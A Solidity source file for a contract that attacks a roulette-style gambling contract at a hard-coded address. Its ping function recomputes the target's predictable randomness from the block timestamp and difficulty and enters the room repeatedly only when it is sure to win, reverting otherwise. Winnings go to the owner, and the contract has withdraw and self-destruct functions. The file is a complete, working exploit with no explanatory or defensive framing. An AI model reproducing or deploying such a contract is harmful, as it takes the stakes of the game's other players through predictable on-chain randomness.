1 pragma solidity ^0.5.0;
2 
3 interface TargetInterface {
4   function getRoom(uint256 _roomId) external view returns (string memory name, address[] memory players, uint256 entryPrice, uint256 balance);
5   function enter(uint256 _roomId) external payable;
6 }
7 
8 contract Proxy_RuletkaIo {
9 
10     address payable private targetAddress = 0xEf02C45C5913629Dd12e7a9446455049775EEC32;
11     address payable private owner;
12 
13     constructor() public payable {
14         owner = msg.sender;
15     }
16 
17     modifier onlyOwner() {
18         require(msg.sender == owner);
19         _;
20     }
21 
22     function ping(uint256 _roomId, bool _keepBalance) public payable onlyOwner {
23         TargetInterface target = TargetInterface(targetAddress);
24 
25         address[] memory players;
26         uint256 entryPrice;
27 
28         (, players, entryPrice,) = target.getRoom(_roomId);
29 
30         uint256 playersLength = players.length;
31         
32         require(playersLength > 0 && playersLength < 6);
33         require(uint256(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 6) < playersLength);
34         
35         uint256 stepCount = 6 - playersLength;
36         uint256 ourBalanceInitial = address(this).balance;
37         
38         for (uint256 i = 0; i < stepCount; i++) {
39             target.enter.value(entryPrice)(_roomId);
40         }
41 
42         require(address(this).balance > ourBalanceInitial);
43         
44         if (!_keepBalance) {
45             owner.transfer(address(this).balance);
46         }
47     }
48 
49     function withdraw() public onlyOwner {
50         owner.transfer(address(this).balance);
51     }
52 
53     function kill() public onlyOwner {
54         selfdestruct(owner);
55     }
56 
57     function() external payable {
58     }
59 
60 }